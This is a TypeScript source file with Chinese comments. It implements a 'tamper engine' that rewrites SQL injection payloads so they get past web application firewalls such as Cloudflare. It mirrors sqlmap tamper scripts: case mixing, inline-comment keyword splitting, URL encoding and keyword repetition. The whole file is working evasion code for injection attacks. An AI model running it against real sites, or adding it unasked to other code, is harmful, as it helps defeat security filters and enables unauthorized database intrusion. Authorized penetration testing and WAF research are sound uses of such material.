/**
 * tamper 引擎 -- WAF 绕过
 *
 * 对注入 payload 应用变形，生成候选，绕过 WAF 关键字/特征检测（如 Cloudflare）。
 * 变体集对应 sqlmap 常用 tamper：
 *   - upper-lower   大小写混合  SeLeCt
 *   - inline-comment 内联注释   SEL[注释符]ECT
 *   - keyword-split  关键字拆分  同 inline-comment（截断点不同）
 *   - url-encode     URL 编码    %27
 *   - keyword-repeat 重复关键字  SELSELECTECT
 */

export const TAMPER_NAMES = ['upper-lower', 'inline-comment', 'keyword-split', 'url-encode', 'keyword-repeat'] as const;

export type TamperName = (typeof TAMPER_NAMES)[number];

export interface TamperVariant { name: TamperName; value: string; }

const KEYWORD_RE = /\b(select|union|from|where|and|or|order|by|insert|update|delete|sleep|database|version|user)\b/gi;

/** 应用单个 tamper 变体 */
export function applyTamper(payload: string, name: string): string {
  switch (name) {
    case 'upper-lower':
      return payload.replace(KEYWORD_RE, (w) =>
        w.split('').map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase())).join(''),
      );
    case 'inline-comment':
      return payload.replace(KEYWORD_RE, (w) => {
        const mid = Math.ceil(w.length / 2);
        return w.slice(0, mid) + '/**/' + w.slice(mid);
      });
    case 'keyword-split':
      return payload.replace(KEYWORD_RE, (w) => w.slice(0, 3) + '/**/' + w.slice(3));
    case 'url-encode':
      return payload.replace(/'/g, '%27').replace(/#/g, '%23');
    case 'keyword-repeat':
      return payload.replace(/\b(select|union|from|where)\b/gi, (w) => w.slice(0, 3) + w + w.slice(3));
    default:
      return payload;
  }
}

/** 生成 payload 的全部 tamper 候选 */
export function tamperVariants(payload: string): TamperVariant[] {
  return TAMPER_NAMES.map((name) => ({ name, value: applyTamper(payload, name) }));
}
